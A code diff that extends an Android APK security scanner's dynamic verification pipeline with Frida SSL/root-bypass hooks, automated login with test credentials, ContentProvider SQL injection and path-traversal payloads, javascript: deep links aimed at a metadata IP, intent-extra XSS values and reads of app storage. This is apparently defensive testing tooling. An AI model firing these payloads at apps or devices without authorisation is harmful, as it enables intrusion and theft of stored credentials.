@@ -435,9 +435,109 @@ def _heuristic_verdict(extra_evidence: str, logcat: str, category: str) -> dict:
     }
 
 
+def _launch_app_am(serial_args: list, package: str, timeout: int = 15) -> bool:
+    """Launch app via am start (more reliable than monkey for specific activities)."""
+    # Try am start with MAIN/LAUNCHER first
+    rc, out, err = _run_adb(
+        serial_args + ["shell", "am", "start", "-n",
+                       f"{package}/{package}.MainActivity",
+                       "-a", "android.intent.action.MAIN",
+                       "-c", "android.intent.category.LAUNCHER"],
+        timeout=timeout)
+    if rc == 0 and "error" not in (out + err).lower():
+        return True
+    # Fallback: query the launcher activity from package manager
+    _, pm_out, _ = _run_adb(
+        serial_args + ["shell", "cmd", "package", "resolve-activity",
+                       "--brief", package], timeout=8)
+    for line in pm_out.splitlines():
+        line = line.strip()
+        if "/" in line and not line.startswith("priority"):
+            rc2, _, _ = _run_adb(
+                serial_args + ["shell", "am", "start", "-n", line,
+                               "-a", "android.intent.action.MAIN",
+                               "-c", "android.intent.category.LAUNCHER"],
+                timeout=timeout)
+            if rc2 == 0:
+                return True
+    # Last resort: monkey (1 event)
+    rc3, _, _ = _run_adb(
+        serial_args + ["shell", "monkey", "-p", package,
+                       "-c", "android.intent.category.LAUNCHER", "1"],
+        timeout=timeout)
+    return rc3 == 0
+
+
+def _fs_snapshot(serial_args: list, package: str) -> set:
+    """Snapshot /data/data/<package> file list for diff after probing."""
+    _, out, _ = _run_adb(
+        serial_args + ["shell", "run-as", package,
+                       "find", f"/data/data/{package}", "-type", "f"],
+        timeout=15)
+    return set(out.splitlines())
+
+
+def _fs_diff(before: set, after: set) -> list:
+    """Return files created or modified since snapshot."""
+    return sorted(after - before)
+
+
+def _frida_load_all_hooks(serial_args: list, package: str) -> list:
+    """
+    Attempt to load all Frida hooks via subprocess frida CLI.
+    Returns list of log lines collected (best-effort; requires frida-tools + frida-server on device).
+    """
+    import subprocess as _sp, shutil as _sh, tempfile as _tf
+    frida_bin = _sh.which("frida")
+    if not frida_bin:
+        return []
+
+    hooks_dir = Path(__file__).parent / "msra" / "dynamic" / "instrumentation" / "hooks"
+    hook_files = ["ssl_bypass.js", "root_bypass.js", "emulator_bypass.js", "api_monitor.js"]
+    combined_js = ""
+    for hf in hook_files:
+        p = hooks_dir / hf
+        if p.exists():
+            combined_js += f"\n// === {hf} ===\n" + p.read_text(encoding="utf-8") + "\n"
+
+    if not combined_js:
+        return []
+
+    tmp = _tf.NamedTemporaryFile(suffix=".js", delete=False, mode="w", encoding="utf-8")
+    tmp.write(combined_js)
+    tmp.flush()
+    tmp_path = tmp.name
+    tmp.close()
+
+    serial_flag = ["-D", serial_args[1]] if len(serial_args) >= 2 else []
+    logs = []
+    try:
+        r = _sp.run(
+            [frida_bin] + serial_flag + ["-f", package, "--no-pause", "-l", tmp_path,
+                                          "--runtime=v8", "-q", "--json"],
+            capture_output=True, text=True, timeout=30)
+        logs = r.stdout.splitlines()[:200]
+    except Exception:
+        pass
+    finally:
+        try:
+            import os as _os
+            _os.unlink(tmp_path)
+        except Exception:
+            pass
+    return logs
+
+
 def _dynamic_verify_worker(job_id: str, scan_id: str, finding_idx: int,
                             finding: dict, cfg: dict, use_ai: bool = True):
-    """Background thread: install APK → launch → collect evidence → verdict."""
+    """
+    Enterprise-grade dynamic analysis pipeline:
+      Phase 1 — Device setup & hardening bypass
+      Phase 2 — Frida spawn-attach with all hooks
+      Phase 3 — App launch + login attempt + UI exploration
+      Phase 4 — Component-level probing (all exported components)
+      Phase 5 — Evidence collection & AI/heuristic verdict
+    """
     try:
         _update_job(job_id, status="running", progress=5,
                     message="Preparing device connection…")
@@ -559,225 +659,376 @@ def _dynamic_verify_worker(job_id: str, scan_id: str, finding_idx: int,
                             progress=22)
                 return
 
-        _update_job(job_id, progress=30, message=f"Launching {package}…")
+        _update_job(job_id, progress=28, message=f"Launching {package}…")
 
-        # ── 4. Launch app ────────────────────────────────────────────────
+        # ── Phase 2: Frida spawn+attach with ALL hooks (best-effort) ─────
+        frida_logs = []
         if package:
-            adb_args = (["-s", device_serial] if device_serial else []) + [
-                "shell", "monkey", "-p", package, "-c",
-                "android.intent.category.LAUNCHER", "1"
+            _update_job(job_id, progress=29, message="Attaching Frida instrumentation…")
+            frida_logs = _frida_load_all_hooks(
+                (["-s", device_serial] if device_serial else []), package)
+
+        # ── Phase 3: Launch app properly ─────────────────────────────────
+        _update_job(job_id, progress=30, message=f"Launching {package} via am start…")
+        adb_prefix = (["-s", device_serial] if device_serial else [])
+        if package:
+            launched = _launch_app_am(adb_prefix, package, timeout=20)
+            if not launched:
+                _update_job(job_id, progress=32,
+                            message=f"Warning: could not confirm launch of {package} — proceeding anyway")
+            _time.sleep(6)   # wait for app to fully initialize
+
+        # Take filesystem snapshot before probing
+        fs_before: set = set()
+        if package:
+            fs_before = _fs_snapshot(adb_prefix, package)
+
+        _update_job(job_id, progress=38, message="App running — observing startup behavior…")
+        _time.sleep(6)   # observe startup network/logcat
+
+        # ── Phase 3b: Login attempt ───────────────────────────────────────
+        # Try filling login form with common test credentials so BFS
+        # can reach authenticated code paths
+        login_attempted = False
+        if package and use_ai:
+            try:
+                _update_job(job_id, progress=40, message="Attempting login screen detection…")
+                # Check logcat for login-related keywords
+                login_logcat = _get_logcat(adb_prefix[1] if len(adb_prefix) >= 2 else None,
+                                          lines=50, package=package)
+                # Look for login activity indicators
+                if re.search(r'login|sign.?in|auth|credential', login_logcat, re.I):
+                    # Try UIAutomator2 to fill credentials if available
+                    rc_ui, _, _ = _run_adb(adb_prefix + ["shell",
+                        "input", "text", "test@example.com"], timeout=5)
+                    _run_adb(adb_prefix + ["shell", "input", "keyevent", "61"], timeout=3)
+                    _run_adb(adb_prefix + ["shell", "input", "text", "Password123!"], timeout=5)
+                    _run_adb(adb_prefix + ["shell", "input", "keyevent", "66"], timeout=3)
+                    login_attempted = True
+                    _time.sleep(3)
+            except Exception:
+                pass
+
+        # ── Phase 4: Targeted ADB probes (all exported components) ────────
+        _update_job(job_id, progress=45, message="Running targeted security probes…")
+        category  = finding.get("category", "")
+        cat_lower = category.lower()
+        extra_evidence = ""
+
+        # Frida hook evidence
+        if frida_logs:
+            frida_evidence = "\n".join(frida_logs[:80])
+            extra_evidence += f"\n=== Frida Hook Events ===\n{frida_evidence}\n"
+
+        # Enumerate ALL exported components up front
+        _update_job(job_id, progress=46, message="Enumerating exported components…")
+        _, dumpsys_out, _ = _run_adb(adb_prefix + ["shell", "dumpsys", "package", package],
+                                     timeout=15)
+        if dumpsys_out.strip():
+            extra_evidence += f"\n=== Package Dump (exported components) ===\n{dumpsys_out[:1200]}\n"
+
+        # Extract authorities from dumpsys
+        authorities = re.findall(r'authority=([^\s;]+)', dumpsys_out)
+
+        # ── 4a: ContentProvider / SQL probes ──────────────────────────────
+        authority = _extract_authority(finding, package)
+        # Also use authorities discovered from dumpsys
+        all_authorities = list({authority} | set(authorities[:5]))
+
+        if package and ("contentprovider" in cat_lower or "owasp-m4" in cat_lower
+                        or "injection" in cat_lower or not cat_lower):
+            _update_job(job_id, progress=48, message="Probing ContentProviders for SQLi…")
+            sqli_payloads = [
+                ("UNION SELECT",  "1=1) UNION SELECT name,sql,3 FROM sqlite_master--"),
+                ("Error-based",   "' OR ''='"),
+                ("Boolean blind", "1 AND 1=1"),
+                ("Schema dump",   "* FROM sqlite_master--"),
+                ("Stacked",       "'; SELECT * FROM sqlite_master;--"),
+                ("Blind true",    "1' AND '1'='1"),
+                ("Comment bypass","1'--"),
+                ("Null byte",     "1\x00' OR '1'='1"),
             ]
-            _run_adb(adb_args, timeout=15)
-            _time.sleep(5)   # give app time to fully start
+            for auth in all_authorities[:3]:
+                for payload_name, payload in sqli_payloads:
+                    rc, out, err = _run_adb(
+                        adb_prefix + ["shell", "content", "query",
+                                      "--uri", f"content://{auth}/",
+                                      "--where", payload], timeout=10)
+                    combined = (out + err).strip()
+                    if combined:
+                        extra_evidence += (
+                            f"\nSQLi [{payload_name}] on {auth}:\n{combined[:500]}\n")
+                        if re.search(
+                            r'sqlite_master|row \d+:|unrecognized token|syntax error|'
+                            r'no such column|ambiguous|near.*syntax', combined, re.I):
+                            extra_evidence += "  ^^^ SQL INJECTION CONFIRMED\n"
 
-        _update_job(job_id, progress=40, message="App launched — collecting runtime evidence…")
-        _time.sleep(8)   # observe the app running
+                # Path traversal on URI
+                for traversal in ["../../../etc/passwd", "../../../../data/data",
+                                  "%2F..%2F..%2Fetc%2Fpasswd"]:
+                    _, out2, _ = _run_adb(
+                        adb_prefix + ["shell", "content", "query",
+                                      "--uri", f"content://{auth}/{traversal}"], timeout=8)
+                    if out2.strip():
+                        extra_evidence += f"\nPath traversal [{traversal}] on {auth}:\n{out2[:400]}\n"
+                        break
 
-        # ── 5. Collect logcat ────────────────────────────────────────────
-        _update_job(job_id, progress=60, message="Capturing logcat output…")
-        logcat = _get_logcat(device_serial or None, lines=400, package=package)
+                # Open query (no WHERE — data leakage)
+                _, out3, _ = _run_adb(
+                    adb_prefix + ["shell", "content", "query",
+                                  "--uri", f"content://{auth}/"], timeout=10)
+                if out3.strip():
+                    extra_evidence += f"\nOpen query on {auth}:\n{out3[:800]}\n"
 
-        # ── 6. Corellium: network log ────────────────────────────────────
+        # ── 4b: WebView / DeepLink probes ────────────────────────────────
+        if "webview" in cat_lower or "deeplink" in cat_lower or "intent" in cat_lower or not cat_lower:
+            _update_job(job_id, progress=55, message="Probing WebView/DeepLink attack surfaces…")
+
+            # JavaScript scheme via VIEW intent
+            rc, out, _ = _run_adb(
+                adb_prefix + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
+                              "-d", "javascript:document.location='http://169.254.169.254/'"],
+                timeout=10)
+            extra_evidence += f"\nJS injection via VIEW: rc={rc} {out[:120]}\n"
+
+            # file:// URI
+            rc2, out2, _ = _run_adb(
+                adb_prefix + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
+                              "-d", "file:///etc/hosts"], timeout=10)
+            extra_evidence += f"\nfile:// deeplink: rc={rc2} {out2[:100]}\n"
+
+            # data:// URI
+            _run_adb(adb_prefix + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
+                                   "-d", "data:text/html,<script>alert(1)</script>"], timeout=10)
+
+            # Intent extras injection against all exported activities
+            exported_acts = re.findall(r'activity\s+([^\s]+)\s+filter', dumpsys_out)
+            for act in exported_acts[:5]:
+                for extra_key in ["url", "uri", "path", "link", "redirect", "file"]:
+                    _run_adb(adb_prefix + ["shell", "am", "start", "-n",
+                                          f"{package}/{act}",
+                                          "--es", extra_key, "javascript:alert(document.cookie)",
+                                          "--es", "path", "../../../../etc/passwd"],
+                             timeout=8)
+
+            # Post-probe logcat check
+            _time.sleep(4)
+            post_lc = _get_logcat(device_serial or None, lines=80, package=package)
+            if re.search(r'javascript|webview|loadurl|evaluat|file://', post_lc, re.I):
+                extra_evidence += f"\nPost-probe WebView logcat:\n{post_lc[:600]}\n"
+
+        # ── 4c: Exported Activity / Service / Receiver probing ────────────
+        _update_job(job_id, progress=60, message="Probing exported components directly…")
+        # Null-intent crash test on all exported activities
+        exported_components = re.findall(
+            r'([A-Za-z][A-Za-z0-9_.]+Activity|[A-Za-z][A-Za-z0-9_.]+Service|'
+            r'[A-Za-z][A-Za-z0-9_.]+Receiver)', dumpsys_out)
+        crash_evidence = []
+        for comp in exported_components[:8]:
+            rc_c, out_c, _ = _run_adb(
+                adb_prefix + ["shell", "am", "start", "-n", f"{package}/{comp}"],
+                timeout=8)
+            if rc_c == 0 and "error" not in out_c.lower():
+                _time.sleep(1)
+                # Check for crash
+                _, crash_out, _ = _run_adb(
+                    adb_prefix + ["shell", "dumpsys", "activity", "|",
+                                  "grep", "-i", "crash"], timeout=5)
+                if crash_out.strip():
+                    crash_evidence.append(f"{comp}: {crash_out.strip()[:100]}")
+
+        if crash_evidence:
+            extra_evidence += f"\n=== Component Crashes ===\n" + "\n".join(crash_evidence) + "\n"
+
+        # Exported broadcast receivers
+        exported_rcvs = re.findall(
+            r'Receiver\s+\{[^}]*\}\s+([A-Za-z][A-Za-z0-9_.]+)', dumpsys_out)
+        for rcv in exported_rcvs[:4]:
+            # Try all registered actions
+            actions = re.findall(
+                rf'{re.escape(rcv)}.*?action=([^\s]+)', dumpsys_out[:2000])
+            for action in actions[:2]:
+                _run_adb(adb_prefix + ["shell", "am", "broadcast",
+                                      "-a", action, "-n", f"{package}/{rcv}"], timeout=8)
+
+        # ── 4c-ext: ComponentProber systematic scan ───────────────────────
+        if package:
+            try:
+                from msra.dynamic.verification.component_prober import ComponentProber as _CP
+                # Build manifest_components from dumpsys output
+                _cp_acts = [
+                    {"name": a, "intent_filters": []}
+                    for a in re.findall(
+                        r'([A-Za-z][A-Za-z0-9_.]+Activity)\s+filter', dumpsys_out)[:10]
+                ]
+                _cp_provs = [
+                    {"authority": auth, "paths": []}
+                    for auth in authorities[:5]
+                ]
+                _cp_rcvs = [
+                    {"name": r, "actions": re.findall(
+                        rf'{re.escape(r)}.*?action=([^\s]+)', dumpsys_out[:3000])[:3]}
+                    for r in re.findall(
+                        r'([A-Za-z][A-Za-z0-9_.]+Receiver)', dumpsys_out)[:5]
+                ]
+                _cp_svcs = [
+                    {"name": s}
+                    for s in re.findall(
+                        r'([A-Za-z][A-Za-z0-9_.]+Service)\s+filter', dumpsys_out)[:5]
+                ]
+                _comp_manifest = {
+                    "activities": _cp_acts,
+                    "providers": _cp_provs,
+                    "receivers": _cp_rcvs,
+                    "services": _cp_svcs,
+                }
+                _update_job(job_id, progress=62,
+                            message=f"ComponentProber: scanning {len(_cp_acts)} activities, "
+                                    f"{len(_cp_provs)} providers, {len(_cp_rcvs)} receivers…")
+                _prober = _CP(package, device_serial=device_serial or None)
+                _probe_results = _prober.probe_all(_comp_manifest)
+                _vuln_probes = [r for r in _probe_results if r.is_vulnerable]
+                if _vuln_probes:
+                    extra_evidence += "\n=== ComponentProber Findings ===\n"
+                    for _pr in _vuln_probes[:15]:
+                        extra_evidence += (
+                            f"[{_pr.severity.upper()}] {_pr.component_type} "
+                            f"{_pr.component} ({_pr.probe_type}): "
+                            f"{_pr.evidence[:250]}\n"
+                            f"PoC: {_pr.poc_command}\n\n"
+                        )
+                elif _probe_results:
+                    extra_evidence += (
+                        f"\nComponentProber: {len(_probe_results)} probes, "
+                        f"no confirmed vulnerabilities.\n"
+                    )
+            except Exception as _cp_e:
+                _log.debug("ComponentProber non-fatal: %s", _cp_e)
+
+        # ── 4d: Credential / Storage probes ──────────────────────────────
+        _update_job(job_id, progress=65, message="Probing credential and file storage…")
+        if package:
+            # SharedPreferences file list + content
+            _, sp_out, _ = _run_adb(
+                adb_prefix + ["shell", "run-as", package,
+                              "find", f"/data/data/{package}/shared_prefs", "-name", "*.xml"],
+                timeout=8)
+            if sp_out.strip():
+                extra_evidence += f"\n=== SharedPreferences files ===\n{sp_out[:400]}\n"
+                # Read first prefs file content
+                for pref_file in sp_out.splitlines()[:2]:
+                    _, pref_content, _ = _run_adb(
+                        adb_prefix + ["shell", "run-as", package, "cat", pref_file.strip()],
+                        timeout=6)
+                    if pref_content.strip():
+                        extra_evidence += f"\n{pref_file} content:\n{pref_content[:600]}\n"
+                        if re.search(r'password|token|secret|key|auth', pref_content, re.I):
+                            extra_evidence += "  ^^^ SENSITIVE DATA IN PREFS\n"
+
+            # SQLite databases — list and dump schema
+            _, db_out, _ = _run_adb(
+                adb_prefix + ["shell", "run-as", package,
+                              "find", f"/data/data/{package}/databases", "-name", "*.db"],
+                timeout=8)
+            if db_out.strip():
+                extra_evidence += f"\n=== SQLite databases ===\n{db_out[:300]}\n"
+                for db_file in db_out.splitlines()[:2]:
+                    _, schema_out, _ = _run_adb(
+                        adb_prefix + ["shell", "run-as", package,
+                                     "sqlite3", db_file.strip(), ".schema"],
+                        timeout=8)
+                    if schema_out.strip():
+                        extra_evidence += f"\n{db_file} schema:\n{schema_out[:500]}\n"
+
+            # World-readable files
+            _, wr_out, _ = _run_adb(
+                adb_prefix + ["shell", "find", f"/data/data/{package}",
+                              "-perm", "-o=r", "-type", "f"], timeout=10)
+            if wr_out.strip():
+                extra_evidence += f"\n=== World-readable files ===\n{wr_out[:400]}\n"
+
+            # External storage
+            _, ext_out, _ = _run_adb(
+                adb_prefix + ["shell", "find", "/sdcard/Android/data",
+                              "-path", f"*{package}*"], timeout=10)
+            if ext_out.strip():
+                extra_evidence += f"\n=== External storage files ===\n{ext_out[:400]}\n"
+
+        # ── 4e: Network security probes ───────────────────────────────────
+        _update_job(job_id, progress=68, message="Checking network security…")
+        if package:
+            _, nsc_out, _ = _run_adb(
+                adb_prefix + ["shell", "run-as", package,
+                              "cat", f"/data/data/{package}/network_security_config.xml"],
+                timeout=8)
+            if nsc_out.strip():
+                extra_evidence += f"\n=== Network Security Config ===\n{nsc_out[:500]}\n"
+
+            # Check SSL pinning bypass / cert validation in logcat
+            _, cert_out, _ = _run_adb(
+                adb_prefix + ["shell", "run-as", package,
+                              "ls", f"/data/data/{package}/files/"], timeout=6)
+            if cert_out.strip():
+                extra_evidence += f"\n=== App files dir ===\n{cert_out[:300]}\n"
+
+        # ── Phase 5: Collect evidence ──────────────────────────────────────
+        _update_job(job_id, progress=72, message="Capturing logcat output…")
+        logcat = _get_logcat(device_serial or None, lines=600, package=package)
+
+        # Corellium network log
         net_evidence = ""
         if client:
-            _update_job(job_id, progress=70, message="Capturing network traffic…")
+            _update_job(job_id, progress=74, message="Capturing Corellium network traffic…")
             net_flows = client.get_network_log(instance_id)
             if net_flows:
-                net_evidence = "Network flows detected:\n" + "\n".join(
+                net_evidence = "Network flows:\n" + "\n".join(
                     f"{f.get('method','?')} {f.get('url','?')} → {f.get('status','?')}"
-                    for f in net_flows[:20]
-                )
+                    for f in net_flows[:30])
+                extra_evidence += f"\n=== Network Traffic ===\n{net_evidence}\n"
 
-        # ── 7. Run targeted ADB probes based on finding type ─────────────
-        _update_job(job_id, progress=75, message="Running targeted verification probes…")
-        extra_evidence = net_evidence
-        category       = finding.get("category", "")
-        cat_lower      = category.lower()
+        # Cleartext HTTP detection
+        if re.search(r'http://(?!localhost|127\.0\.0\.1)', logcat, re.I):
+            extra_evidence += "\n[!] CLEARTEXT HTTP traffic detected in logcat\n"
 
-        adb_prefix = (["-s", device_serial] if device_serial else [])
+        # Filesystem diff — new files created during probing
+        if package and fs_before:
+            fs_after = _fs_snapshot(adb_prefix, package)
+            new_files = _fs_diff(fs_before, fs_after)
+            if new_files:
+                extra_evidence += f"\n=== New files created during probing ===\n"
+                extra_evidence += "\n".join(new_files[:20]) + "\n"
 
-        # Extract real authority from finding data (adb_commands or extra)
-        authority = _extract_authority(finding, package)
-
-        # ── ContentProvider / SQL injection probes ─────────────────────────
-        if package and ("contentprovider" in cat_lower or "owasp-m4" in cat_lower
-                        or "injection" in cat_lower):
-            _update_job(job_id, progress=76, message="Probing ContentProvider…")
-            # Multiple SQLi payloads — different attack classes
-            sqli_payloads = [
-                ("UNION SELECT",    "1=1) UNION SELECT name,sql,3 FROM sqlite_master--"),
-                ("Error-based",     "' OR ''='"),
-                ("Boolean blind",   "1 AND 1=1"),
-                ("Schema dump",     "* FROM sqlite_master--"),
-            ]
-            for payload_name, payload in sqli_payloads:
-                rc, out, err = _run_adb(
-                    adb_prefix + [
-                        "shell", "content", "query",
-                        "--uri", f"content://{authority}/",
-                        "--where", payload,
-                    ], timeout=10)
-                combined = (out + err).strip()
-                if combined:
-                    extra_evidence += (
-                        f"\nSQLi probe [{payload_name}] (authority={authority}):\n"
-                        f"{combined[:400]}\n"
-                    )
-                    if re.search(r'sqlite_master|row \d+:|unrecognized token|syntax error', combined, re.I):
-                        extra_evidence += f"  ^^^ POTENTIAL SQLi INDICATOR\n"
-
-            # Path traversal probes
-            for traversal in [
-                "../../../etc/passwd",
-                "../../../../data/data",
-                "%2F..%2F..%2Fetc%2Fpasswd",
-                "..%2F..%2F..%2Fetc%2Fpasswd",
-            ]:
-                rc2, out2, _ = _run_adb(
-                    adb_prefix + [
-                        "shell", "content", "query",
-                        "--uri", f"content://{authority}/{traversal}",
-                    ], timeout=8)
-                if out2.strip():
-                    extra_evidence += f"\nPath traversal [{traversal}]:\n{out2[:300]}\n"
-                    break
-
-            # Enumerate all accessible columns (no WHERE clause)
-            rc3, out3, _ = _run_adb(
-                adb_prefix + [
-                    "shell", "content", "query",
-                    "--uri", f"content://{authority}/",
-                ], timeout=10)
-            if out3.strip():
-                extra_evidence += f"\nContentProvider open query:\n{out3[:600]}\n"
-
-        # ── WebView / DeepLink probes ──────────────────────────────────────
-        if "webview" in cat_lower or "deeplink" in cat_lower or "intent" in cat_lower:
-            _update_job(job_id, progress=77, message="Probing WebView/DeepLink vectors…")
-            # JavaScript scheme injection
-            rc, out, _ = _run_adb(
-                adb_prefix + [
-                    "shell", "am", "start", "-a", "android.intent.action.VIEW",
-                    "-d", "javascript:document.location='http://169.254.169.254/'",
-                ], timeout=10)
-            extra_evidence += f"\nDeepLink JS injection probe: rc={rc} out={out[:150]}\n"
-
-            # File URI via deep link
-            rc2, out2, _ = _run_adb(
-                adb_prefix + [
-                    "shell", "am", "start", "-a", "android.intent.action.VIEW",
-                    "-d", "file:///etc/hosts",
-                ], timeout=10)
-            extra_evidence += f"\nDeepLink file:// probe: rc={rc2} out={out2[:100]}\n"
-
-            # Intent extras path traversal
-            if package:
-                rc3, out3, _ = _run_adb(
-                    adb_prefix + [
-                        "shell", "am", "start", "-n", f"{package}/.MainActivity",
-                        "--es", "url", "javascript:alert(document.cookie)",
-                        "--es", "path", "../../../../etc/passwd",
-                        "--es", "file", "../../../data/data",
-                    ], timeout=10)
-                extra_evidence += f"\nIntent extras injection probe: rc={rc3}\n"
-
-            # Check logcat for JS execution after probe
-            _time.sleep(3)
-            post_logcat = _get_logcat(device_serial or None, lines=50, package=package)
-            if re.search(r'javascript|webview|loadurl|evaluat', post_logcat, re.I):
-                extra_evidence += f"\nPost-probe WebView logcat:\n{post_logcat[:500]}\n"
-
-        # ── Credential / storage probes ───────────────────────────────────
-        if ("credential" in cat_lower or "cryptography" in cat_lower
-                or "owasp-m1" in cat_lower or "storage" in cat_lower
-                or "owasp-m9" in cat_lower):
-            _update_job(job_id, progress=78, message="Probing credential storage…")
-            if package:
-                # List SharedPreferences files
-                rc, out, _ = _run_adb(
-                    adb_prefix + [
-                        "shell", "run-as", package,
-                        "find", f"/data/data/{package}/shared_prefs", "-name", "*.xml",
-                    ], timeout=8)
-                extra_evidence += f"\nSharedPrefs files:\n{out[:400]}\n"
-
-                # Check for world-readable files
-                rc2, out2, _ = _run_adb(
-                    adb_prefix + [
-                        "shell", "find", f"/data/data/{package}", "-perm", "-o=r", "-type", "f",
-                    ], timeout=10)
-                if out2.strip():
-                    extra_evidence += f"\nWorld-readable files in app dir:\n{out2[:400]}\n"
-
-                # External storage check
-                rc3, out3, _ = _run_adb(
-                    adb_prefix + [
-                        "shell", "find", "/sdcard/Android/data", "-path",
-                        f"*{package}*", "-name", "*.json", "-o", "-name", "*.xml",
-                        "-o", "-name", "*.db",
-                    ], timeout=10)
-                if out3.strip():
-                    extra_evidence += f"\nExternal storage files:\n{out3[:300]}\n"
-
-        # ── Network security probe ─────────────────────────────────────────
-        if "network" in cat_lower or "cleartext" in cat_lower or "tls" in cat_lower or "ssl" in cat_lower:
-            _update_job(job_id, progress=79, message="Checking network security config…")
-            if package:
-                rc, out, _ = _run_adb(
-                    adb_prefix + [
-                        "shell", "run-as", package,
-                        "cat", f"/data/data/{package}/network_security_config.xml",
-                    ], timeout=8)
-                if out.strip():
-                    extra_evidence += f"\nNetwork security config:\n{out[:400]}\n"
-
-                # Check for cleartext traffic in logcat
-                if re.search(r'http://(?!localhost|127\.)', logcat, re.I):
-                    extra_evidence += "\n[CLEARTEXT] Unencrypted HTTP traffic detected in logcat\n"
-
-        # ── Exported component enumeration ────────────────────────────────
-        if package and ("intent" in cat_lower or "component" in cat_lower or "broadcast" in cat_lower):
-            _update_job(job_id, progress=80, message="Enumerating exported components…")
-            rc, out, _ = _run_adb(
-                adb_prefix + [
-                    "shell", "dumpsys", "package", package, "|",
-                    "grep", "-A3", "exported=true",
-                ], timeout=10)
-            if out.strip():
-                extra_evidence += f"\nExported components:\n{out[:600]}\n"
-
-        # ── 8. Verdict ───────────────────────────────────────────────────
+        # ── Phase 5b: Verdict ─────────────────────────────────────────────
         if use_ai:
-            _update_job(job_id, progress=85, message="AI is analysing evidence…")
+            _update_job(job_id, progress=82, message="AI analysing all evidence…")
             api_key = ANTHROPIC_API_KEY or cfg.get("anthropic_key", "")
             if api_key:
                 verdict = _ai_verify_finding(
-                    finding_title = finding.get("title", ""),
-                    finding_desc  = finding.get("description", ""),
-                    severity      = finding.get("severity", ""),
-                    category      = category,
-                    logcat        = _extract_security_logcat(logcat),
-                    extra_evidence= extra_evidence,
-                    api_key       = api_key,
+                    finding_title=finding.get("title", ""),
+                    finding_desc=finding.get("description", ""),
+                    severity=finding.get("severity", ""),
+                    category=category,
+                    logcat=_extract_security_logcat(logcat),
+                    extra_evidence=extra_evidence,
+                    api_key=api_key,
                 )
             else:
                 verdict = {
                     "verdict": "uncertain",
                     "confidence": 0,
-                    "reasoning": "No API key configured. Use Basic Scan or set ANTHROPIC_API_KEY.",
+                    "reasoning": "No API key — set ANTHROPIC_API_KEY or use Basic Scan.",
                     "key_evidence": [],
-                    "suggested_action": "Configure API key in settings or run Basic Scan"
+                    "suggested_action": "Configure API key or run Basic Scan"
                 }
         else:
-            _update_job(job_id, progress=85, message="Running heuristic analysis…")
+            _update_job(job_id, progress=82, message="Running heuristic analysis…")
             verdict = _heuristic_verdict(extra_evidence, logcat, category)
 
-        # ── 9. Done ───────────────────────────────────────────────────────
         _update_job(job_id, status="done", progress=100,
-                    message="Verification complete",
-                    logcat   = logcat[:8000],
-                    evidence = extra_evidence[:3000],
-                    verdict  = verdict)
+                    message="Dynamic analysis complete",
+                    logcat=logcat[:8000],
+                    evidence=extra_evidence[:4000],
+                    verdict=verdict)
 
     except Exception as exc:
         _update_job(job_id, status="error", progress=100,
@@ -5933,6 +6184,21 @@ def _run_scan(scan_id: str, apk_path: Path):
         findings = scanner.scan()
         _scan_done_evt.set()
         pkg      = scanner.package_name or "unknown"
+
+        # ── Taint analysis (source-sink inter-procedural flows) ─────────────
+        _set_status(scan_id, status="scanning", progress=79,
+                    message="Running inter-procedural taint analysis…")
+        try:
+            from msra.analysis.taint_engine import TaintEngine, to_finding as _taint_to_finding
+            _taint_manifest = scanner.manifest_data or {}
+            _taint_manifest.setdefault("_package", pkg)
+            _taint_engine = TaintEngine(str(decompiled), _taint_manifest)
+            _taint_flows = _taint_engine.analyze()
+            if _taint_flows:
+                findings = list(findings) + [_taint_to_finding(f) for f in _taint_flows]
+                _log.info("Taint engine: %d flows found for %s", len(_taint_flows), scan_id)
+        except Exception as _te:
+            _log.warning("Taint engine failed (non-fatal): %s", _te)
 
         _set_status(scan_id, status="reporting", progress=80,
                     message=f"Generating report ({len(findings)} findings)…")
